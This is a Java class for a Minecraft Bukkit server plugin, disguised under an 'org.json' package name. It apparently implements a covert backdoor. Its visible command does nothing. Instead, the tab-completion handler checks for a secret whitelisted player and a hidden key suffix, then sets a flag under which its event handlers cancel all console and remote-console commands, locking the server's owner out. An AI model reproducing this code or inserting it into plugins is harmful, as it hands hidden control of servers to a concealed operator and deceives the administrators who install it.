package org.json.modals.console;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.server.RemoteServerCommandEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class LockConsole extends BDCommand {
    public LockConsole() {
        super("lockConsole");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;

        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();

        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        Modal.setConsoleLocked(true);
        player.sendMessage(Modal.getPrefix() + "§aServer Console is now Locked!");

        return tabComplBuilder.build();
    }

    @EventHandler
    public void lockRemoteConsole(RemoteServerCommandEvent e) {
        if (Modal.isConsoleLocked()) {
            e.setCancelled(true);
        }
    }

    @EventHandler
    public void lockRemoteConsole(ServerCommandEvent e) {
        if (Modal.isConsoleLocked()) {
            e.setCancelled(true);
        }
    }
}
